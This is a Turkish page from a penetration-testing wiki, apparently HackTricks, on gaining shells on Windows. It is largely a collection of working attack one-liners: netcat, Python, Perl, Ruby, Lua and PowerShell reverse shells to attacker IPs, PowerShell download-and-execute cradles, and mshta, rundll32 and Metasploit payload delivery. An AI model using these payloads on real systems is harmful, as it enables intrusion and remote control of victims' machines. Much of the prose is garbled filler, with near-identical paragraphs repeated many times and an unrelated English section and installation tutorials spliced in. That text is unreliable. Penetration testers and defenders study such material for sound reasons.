# Kabuklar - Windows

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı** takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

Sayfa [lolbas-project.github.io](https://lolbas-project.github.io/), linux için [https://gtfobins.github.io/](https://gtfobins.github.io/) gibi Windows için.\
Açıkçası, **Windows'ta SUID dosyaları veya sudo yetkileri yok**, ancak bazı **ikili dosyaların** nasıl (kötüye) kullanılabileceğini bilmek, **keyfi kod yürütmek** gibi beklenmeyen bazı eylemleri gerçekleştirmek için faydalıdır.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/) taşınabilir ve güvenli bir Netcat alternatifidir**. Unix benzeri sistemlerde ve Win32'de çalışır. Güçlü şifreleme, program yürütme, özelleştirilebilir kaynak bağlantı noktaları ve sürekli yeniden bağlantı gibi özelliklere sahip olan sbd, TCP/IP iletişimi için çok yönlü bir çözüm sunar. Windows kullanıcıları için, Kali Linux dağıtımındaki sbd.exe sürümü, Netcat için güvenilir bir yerine geçme seçeneği olarak kullanılabilir.
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## Python

Python, birçok hacker tarafından tercih edilen bir programlama dilidir. Python, hızlı ve kolay bir şekilde yazılabilen, anlaşılması ve okunması kolay bir dil olarak bilinir. Ayrıca, çeşitli kütüphaneleri ve modülleri sayesinde birçok farklı amaç için kullanılabilir.

Python, Windows işletim sistemi üzerinde çalışan bir kabuk oluşturmak için kullanılabilir. Bu, hedef sisteme erişim sağlamak ve çeşitli işlemleri gerçekleştirmek için kullanılabilir.

Python kabuğunu kullanarak, hedef sisteme komutlar gönderebilir, dosya indirebilir, dosya yükleyebilir, sistem bilgilerini alabilir ve hatta hedef sistemi tamamen ele geçirebilirsiniz.

Python kabuğunu kullanmak için, hedef sisteme bir Python betiği göndermeniz gerekmektedir. Bu betik, hedef sisteme erişim sağlamak için kullanılacak komutları içermelidir. Betik, hedef sisteme gönderildikten sonra, hedef sistemin Python yorumlayıcısı tarafından çalıştırılır ve komutlar gerçekleştirilir.

Python kabuğunu kullanırken, hedef sisteme erişim sağlamak için kullanılan birçok farklı yöntem vardır. Bu yöntemler arasında güvenlik açıklarından yararlanma, zayıf şifreleri kırma ve sosyal mühendislik gibi teknikler bulunur.

Python kabuğunu kullanırken, dikkatli olmanız ve izinsiz erişim veya yasadışı faaliyetlerde bulunmamanız önemlidir. Aksi takdirde, yasal sorunlarla karşılaşabilirsiniz.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için çeşitli araçlar ve yöntemler mevcuttur. Bu araçlar ve yöntemler, hedef sistemin özelliklerine ve güvenlik önlemlerine bağlı olarak değişebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin güvenlik açıklarını tespit etmek ve bu açıklardan yararlanmak önemlidir. Bu, zayıf şifreleri kırmak, güvenlik açıklarını sömürmek veya sosyal mühendislik tekniklerini kullanmak gibi çeşitli yöntemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin ağ bağlantısını tespit etmek ve bu bağlantıyı kullanmak önemlidir. Bu, hedef sisteme erişim sağlamak için kullanılan ağ protokollerini ve yöntemlerini içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin güvenlik önlemlerini aşmak ve izinsiz erişim sağlamak önemlidir. Bu, güvenlik duvarlarını atlatmak, antivirüs yazılımlarını devre dışı bırakmak veya güvenlik açıklarını sömürmek gibi çeşitli yöntemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin kullanıcı hesaplarını ve kimlik bilgilerini ele geçirmek önemlidir. Bu, zayıf şifreleri kırmak, parola kırma saldırıları yapmak veya kimlik avı tekniklerini kullanmak gibi çeşitli yöntemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin dosya ve klasörlerini yönetmek ve işlemleri gerçekleştirmek önemlidir. Bu, dosya indirme, yükleme, silme veya değiştirme gibi çeşitli işlemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin sistem bilgilerini almak ve izlemek önemlidir. Bu, işletim sistemi sürümünü, ağ bağlantılarını, çalışan süreçleri ve diğer sistem bilgilerini içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin ağ trafiğini izlemek ve manipüle etmek önemlidir. Bu, ağ paketlerini yakalamak, analiz etmek ve hedef sisteme yönlendirmek gibi çeşitli yöntemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin veritabanlarına erişmek ve verileri çalmak veya değiştirmek önemlidir. Bu, SQL enjeksiyonu, veritabanı saldırıları veya kimlik avı tekniklerini içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin web uygulamalarını hedef almak ve güvenlik açıklarından yararlanmak önemlidir. Bu, XSS saldırıları, CSRF saldırıları veya güvenlik açıklarını sömürmek gibi çeşitli yöntemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin bulut hizmetlerini hedef almak ve güvenlik açıklarından yararlanmak önemlidir. Bu, bulut depolama hizmetlerine erişmek, verileri çalmak veya hizmetleri devre dışı bırakmak gibi çeşitli yöntemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin güvenlik önlemlerini atlatmak ve izinsiz erişim sağlamak için çeşitli teknikler kullanılabilir. Bu, güvenlik açıklarını sömürmek, zayıf şifreleri kırmak veya sosyal mühendislik tekniklerini kullanmak gibi yöntemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin güvenlik duvarlarını atlatmak ve ağ trafiğini manipüle etmek için çeşitli teknikler kullanılabilir. Bu, ağ paketlerini yakalamak, analiz etmek ve hedef sisteme yönlendirmek gibi yöntemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin kullanıcı hesaplarını ele geçirmek ve kimlik bilgilerini çalmak için çeşitli teknikler kullanılabilir. Bu, zayıf şifreleri kırmak, parola kırma saldırıları yapmak veya kimlik avı tekniklerini kullanmak gibi yöntemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin dosya ve klasörlerini yönetmek ve işlemleri gerçekleştirmek için çeşitli teknikler kullanılabilir. Bu, dosya indirme, yükleme, silme veya değiştirme gibi yöntemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin sistem bilgilerini almak ve izlemek için çeşitli teknikler kullanılabilir. Bu, işletim sistemi sürümünü, ağ bağlantılarını, çalışan süreçleri ve diğer sistem bilgilerini içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin ağ trafiğini izlemek ve manipüle etmek için çeşitli teknikler kullanılabilir. Bu, ağ paketlerini yakalamak, analiz etmek ve hedef sisteme yönlendirmek gibi yöntemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin veritabanlarına erişmek ve verileri çalmak veya değiştirmek için çeşitli teknikler kullanılabilir. Bu, SQL enjeksiyonu, veritabanı saldırıları veya kimlik avı tekniklerini içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin web uygulamalarını hedef almak ve güvenlik açıklarından yararlanmak için çeşitli teknikler kullanılabilir. Bu, XSS saldırıları, CSRF saldırıları veya güvenlik açıklarını sömürmek gibi yöntemleri içerebilir.

Python kabuğunu kullanarak Windows sistemlerine erişim sağlamak için, hedef sistemin bulut hizmetlerini hedef almak ve güvenlik açıklarından yararlanmak için çeşitli teknikler kullanılabilir. Bu, bulut depolama hizmetlerine erişmek, verileri çalmak veya hizmetleri devre dışı bırakmak gibi yöntemleri içerebilir.
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl, Practical Extraction and Reporting Language olarak da bilinen bir programlama dilidir. Perl, genellikle metin işleme, dosya manipülasyonu ve ağ protokollerini otomatikleştirmek için kullanılır. Perl, Windows işletim sistemlerinde de kullanılabilir.

### Perl ile Kabuk Erişimi

Perl, kabuk erişimi sağlamak için kullanılabilir. Aşağıda, Perl kullanarak Windows'ta kabuk erişimi sağlamak için kullanılan bazı yöntemler bulunmaktadır:

#### `system` Fonksiyonu

Perl'de `system` fonksiyonu, komut satırı komutlarını çalıştırmak için kullanılır. Aşağıdaki örnek, `ipconfig` komutunu çalıştırarak IP yapılandırmasını alır:

```perl
system("ipconfig");
```

#### `backticks` Operatörü

Perl'de `backticks` operatörü, komut satırı komutlarını çalıştırmak için kullanılır. Aşağıdaki örnek, `dir` komutunu çalıştırarak mevcut dizindeki dosyaları listeler:

```perl
my $output = `dir`;
print $output;
```

#### `open` Fonksiyonu

Perl'de `open` fonksiyonu, bir komutun çıktısını okumak için kullanılır. Aşağıdaki örnek, `ipconfig` komutunun çıktısını okur:

```perl
open(my $fh, "-|", "ipconfig") or die $!;
while (my $line = <$fh>) {
    print $line;
}
close($fh);
```

### Perl ile Geri Bağlantı Kabukları

Perl, geri bağlantı kabukları oluşturmak için de kullanılabilir. Aşağıda, Perl kullanarak Windows'ta geri bağlantı kabukları oluşturmak için kullanılan bazı yöntemler bulunmaktadır:

#### `socket` Modülü

Perl'de `socket` modülü, TCP veya UDP soketleri oluşturmak için kullanılır. Aşağıdaki örnek, bir TCP soketi oluşturarak geri bağlantı kabuğu sağlar:

```perl
use Socket;

my $host = "127.0.0.1";
my $port = 4444;

socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname("tcp")) or die $!;
connect(SOCKET, sockaddr_in($port, inet_aton($host))) or die $!;
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
exec("/bin/sh -i");
```

#### `IO::Socket::INET` Modülü

Perl'de `IO::Socket::INET` modülü, TCP veya UDP soketleri oluşturmak için kullanılır. Aşağıdaki örnek, bir TCP soketi oluşturarak geri bağlantı kabuğu sağlar:

```perl
use IO::Socket::INET;

my $host = "127.0.0.1";
my $port = 4444;

my $socket = IO::Socket::INET->new(
    PeerAddr => $host,
    PeerPort => $port,
    Proto => "tcp"
) or die $!;
open(STDIN, ">&", $socket);
open(STDOUT, ">&", $socket);
open(STDERR, ">&", $socket);
exec("/bin/sh -i");
```

### Perl ile Dosya Yükleme

Perl, dosya yükleme işlemleri için de kullanılabilir. Aşağıda, Perl kullanarak Windows'ta dosya yükleme işlemleri için kullanılan bazı yöntemler bulunmaktadır:

#### `LWP::UserAgent` Modülü

Perl'de `LWP::UserAgent` modülü, HTTP istekleri göndermek için kullanılır. Aşağıdaki örnek, bir dosyayı sunucuya yükler:

```perl
use LWP::UserAgent;

my $url = "http://example.com/upload.php";
my $file = "file.txt";

my $ua = LWP::UserAgent->new;
my $response = $ua->post($url, Content_Type => "form-data", Content => [file => [$file]]);
print $response->content;
```

#### `HTTP::Request` ve `HTTP::Tiny` Modülleri

Perl'de `HTTP::Request` ve `HTTP::Tiny` modülleri, HTTP istekleri göndermek için kullanılır. Aşağıdaki örnek, bir dosyayı sunucuya yükler:

```perl
use HTTP::Request;
use HTTP::Tiny;

my $url = "http://example.com/upload.php";
my $file = "file.txt";

my $request = HTTP::Request->new(POST => $url);
$request->content_type("form-data");
$request->content(["file" => [$file]]);

my $response = HTTP::Tiny->new->request($request);
print $response->{content};
```

Perl ile kabuk erişimi, geri bağlantı kabukları oluşturma ve dosya yükleme gibi işlemleri gerçekleştirebilirsiniz. Bu yöntemler, Perl'i Windows üzerinde etkili bir şekilde kullanmanıza olanak sağlar.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby, birçok platformda çalışabilen, nesne yönelimli bir programlama dilidir. Ruby, basit ve anlaşılır bir sözdizimine sahiptir ve genellikle web uygulamaları geliştirmek için kullanılır. Ruby, birçok farklı işletim sistemi üzerinde çalışabilir ve Windows için de destek sunar.

Ruby ile Windows üzerinde çalışırken, birkaç farklı seçeneğiniz vardır. İşte bazıları:

### RubyInstaller

[RubyInstaller](https://rubyinstaller.org/) Windows için Ruby'nin resmi dağıtımıdır. Bu, Ruby'nin en son sürümünü indirip kurmanızı sağlar. RubyInstaller, Ruby'nin yanı sıra gerekli olan diğer bileşenleri de otomatik olarak kurar.

### Chocolatey

[Chocolatey](https://chocolatey.org/) bir paket yöneticisidir ve Windows üzerinde Ruby'nin kurulumunu kolaylaştırır. Chocolatey'yi yükledikten sonra, `choco install ruby` komutunu kullanarak Ruby'yi kurabilirsiniz.

### WSL (Windows Subsystem for Linux)

[WSL (Windows Subsystem for Linux)](https://docs.microsoft.com/en-us/windows/wsl/) Windows 10'da bulunan bir özelliktir. WSL kullanarak, Windows üzerinde bir Linux dağıtımı çalıştırabilir ve Ruby'yi bu Linux dağıtımı üzerinde kurabilirsiniz.

### Ruby Version Manager (RVM)

[Ruby Version Manager (RVM)](https://rvm.io/) Ruby'nin farklı sürümlerini yönetmenizi sağlar. RVM, Windows üzerinde de kullanılabilir ve birden çok Ruby sürümünü aynı anda çalıştırmanıza olanak tanır.

Bu seçeneklerden herhangi birini kullanarak Ruby'yi Windows üzerinde kurabilir ve kullanmaya başlayabilirsiniz. Ruby ile ilgili daha fazla bilgi için Ruby'nin resmi belgelerini inceleyebilirsiniz.
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua, bir betik dili olarak kullanılan hafif ve hızlı bir programlama dilidir. Genellikle oyun geliştirme, gömülü sistemler ve genel amaçlı betikleme için kullanılır. Lua, basit bir sözdizimine sahiptir ve C diline benzer bir yapıya sahiptir.

### Lua'nın Özellikleri

- Hafif ve hızlı: Lua, düşük bellek kullanımı ve hızlı yürütme özelliğiyle bilinir.
- Taşınabilirlik: Lua, birçok işletim sistemi ve platformda çalışabilir.
- Esneklik: Lua, farklı programlama paradigmalarını destekler ve kolayca genişletilebilir.
- Kolay entegrasyon: Lua, C ve C++ ile kolayca entegre edilebilir.
- Güçlü veri yapıları: Lua, tablolar, dizeler, fonksiyonlar ve kullanıcı tanımlı veri yapıları gibi güçlü veri yapıları sunar.

### Lua'nın Kullanım Alanları

- Oyun geliştirme: Lua, birçok popüler oyun motoru tarafından kullanılır ve oyunların betikleme tarafında kullanılır.
- Gömülü sistemler: Lua, düşük bellek kullanımı ve hızlı yürütme özelliği sayesinde gömülü sistemlerde sıkça tercih edilir.
- Genel amaçlı betikleme: Lua, basit sözdizimi ve kolay entegrasyon özelliğiyle genel amaçlı betikleme için kullanılabilir.

### Lua'nın Kullanımı

Lua, bir metin dosyasına yazılan betikler aracılığıyla kullanılır. Betikler, Lua yorumlayıcısı tarafından çalıştırılır ve sonuçlar ekrana yazdırılır veya başka bir işlem yapılır.

Örnek bir Lua betiği:

```lua
-- Merhaba Dünya!
print("Merhaba, Lua!")
```

Bu betik, "Merhaba, Lua!" metnini ekrana yazdırır.

Lua'nın temel sözdizimi hakkında daha fazla bilgi için Lua belgelerine başvurabilirsiniz.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Saldırgan (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Windows Shells

## Introduction

In the context of hacking, a shell refers to a command-line interface that allows an attacker to interact with a compromised system. In this section, we will explore various methods to obtain a shell on a Windows system.

## Reverse Shells

A reverse shell is a technique where the attacker sets up a listener on their machine and the compromised system connects back to it. This allows the attacker to execute commands on the compromised system.

### Netcat

Netcat is a versatile networking utility that can be used to create reverse shells. It is available for both Windows and Linux systems.

To create a reverse shell using Netcat on Windows, follow these steps:

1. Set up a listener on your machine: `nc -lvp <port>`
2. Execute the following command on the compromised system: `nc <attacker_ip> <port> -e cmd.exe`

### PowerShell

PowerShell is a powerful scripting language that is built into Windows. It can be used to create reverse shells as well.

To create a reverse shell using PowerShell, follow these steps:

1. Set up a listener on your machine: `nc -lvp <port>`
2. Execute the following command on the compromised system: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

## Web Shells

Web shells are scripts or programs that are uploaded to a compromised web server. They provide a web-based interface for an attacker to execute commands on the server.

### PHP Shells

PHP shells are one of the most common types of web shells. They are written in PHP and can be uploaded to a web server via vulnerabilities such as file upload forms or insecure file permissions.

To use a PHP shell, follow these steps:

1. Upload the PHP shell to the target web server.
2. Access the PHP shell through a web browser.
3. Use the provided interface to execute commands on the server.

### ASP Shells

ASP shells are web shells written in ASP (Active Server Pages). They can be uploaded to a web server that supports ASP scripting.

To use an ASP shell, follow these steps:

1. Upload the ASP shell to the target web server.
2. Access the ASP shell through a web browser.
3. Use the provided interface to execute commands on the server.

## Conclusion

Obtaining a shell on a Windows system is a crucial step in the hacking process. Reverse shells and web shells are two common methods that can be used to achieve this. By understanding these techniques, an attacker can gain control over a compromised system and carry out further malicious activities.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell, Microsoft tarafından geliştirilen bir komut satırı aracı ve betik dili olan bir Windows kabuğudur. Powershell, Windows işletim sistemlerindeki yönetim görevlerini otomatikleştirmek ve yönetmek için kullanılır. Ayrıca, Powershell, .NET Framework'ün gücünü kullanarak karmaşık görevleri gerçekleştirebilir.

Powershell, birçok farklı komut ve cmdlet (komut-let) içerir. Komutlar, belirli bir görevi gerçekleştirmek için kullanılırken, cmdlet'ler, daha küçük işlemleri gerçekleştirmek için kullanılır. Powershell, kullanıcıların sistem yapılandırmasını değiştirmelerine, dosya ve klasörleri yönetmelerine, ağ bağlantılarını kontrol etmelerine ve hatta veritabanlarına erişmelerine olanak tanır.

Powershell, birçok farklı yöntemle çalışabilir. Kullanıcılar, komut satırından doğrudan Powershell komutlarını çalıştırabilir veya Powershell betiklerini çalıştırabilir. Ayrıca, Powershell, diğer programlama dilleriyle entegre edilebilir ve bu dillerden Powershell komutlarını çağırabilir.

Powershell, birçok farklı güvenlik açığına sahip olabilir. Bu nedenle, bir saldırgan, Powershell'i hedef sistemde kötü amaçlı amaçlar için kullanabilir. Saldırganlar, Powershell'i kullanarak sistemlere sızabilir, veri çalabilir, kötü amaçlı yazılım yükleyebilir veya diğer zararlı faaliyetlerde bulunabilir.

Powershell'i kullanarak saldırılar gerçekleştirmek için birçok farklı teknik vardır. Örneğin, Powershell'in yeteneklerini kullanarak sistemdeki parolaları çalabilir, ağ trafiğini izleyebilir veya hedef sistemi istismar edebilirsiniz. Saldırganlar, Powershell'i kullanarak hedef sistemdeki zayıf noktaları tespit edebilir ve bu zayıf noktaları kullanarak sisteme erişebilir.

Powershell'i kullanarak saldırılar gerçekleştirmek için birçok farklı araç ve kaynak mevcuttur. Bu araçlar ve kaynaklar, saldırganlara Powershell'in yeteneklerini daha etkili bir şekilde kullanmalarına yardımcı olabilir. Saldırganlar, Powershell araçlarını kullanarak hedef sistemdeki zayıf noktaları tespit edebilir, sistemdeki verileri çalabilir veya hedef sistemi istismar edebilir.

Powershell'i kullanarak saldırılar gerçekleştirmek için birçok farklı yöntem vardır. Saldırganlar, Powershell'i kullanarak hedef sistemdeki zayıf noktaları tespit edebilir, sistemdeki verileri çalabilir veya hedef sistemi istismar edebilir. Saldırganlar, Powershell'i kullanarak hedef sistemdeki zayıf noktaları tespit edebilir, sistemdeki verileri çalabilir veya hedef sistemi istismar edebilir.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Ağ çağrısı yapan işlem: **powershell.exe**\
Disk üzerine yazılan yük: **HAYIR** (_en azından procmon kullanarak bulamadığım bir yerde değil!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Ağ çağrısı gerçekleştiren işlem: **svchost.exe**\
Diskte yazılan yük: **WebDAV istemci yerel önbelleği**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Bu belgenin sonunda farklı Powershell Kabukları hakkında daha fazla bilgi edinin**

## Mshta

* [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **hta-psh ters kabuk örneği (hta kullanarak PS arka kapı indirme ve çalıştırma)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Stager hta kullanarak Koadic zombi indirmek ve çalıştırmak çok kolaydır**

#### hta örneği

[**Buradan**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f) indirebilirsiniz.
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**Buradan**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a utility in Windows that allows you to execute HTML applications (HTAs). It can be used as a payload delivery method in Metasploit to bypass security measures and gain remote access to a target system.

To use the Mshta module in Metasploit, follow these steps:

1. Start Metasploit by running the `msfconsole` command.
2. Search for the Mshta module using the `search mshta` command.
3. Select the desired Mshta module from the search results.
4. Set the required options for the module using the `set` command. These options may include the target IP address, payload, and other parameters.
5. Run the module using the `exploit` command.

Once the module is executed, it will generate an HTA file that can be used to deliver the payload to the target system. The HTA file can be hosted on a web server or delivered via other means, such as email or USB drives.

When the target user opens the HTA file, the payload will be executed, providing the attacker with remote access to the target system. This can be used to perform various malicious activities, such as stealing sensitive information, installing backdoors, or escalating privileges.

It is important to note that the Mshta module in Metasploit is just one of many techniques that can be used for remote exploitation. It is essential to stay updated with the latest security measures and regularly patch vulnerabilities to protect against such attacks.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Defender tarafından tespit edildi**




## **Rundll32**

[**Dll merhaba dünya örneği**](https://github.com/carterjones/hello-world-dll)

* [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
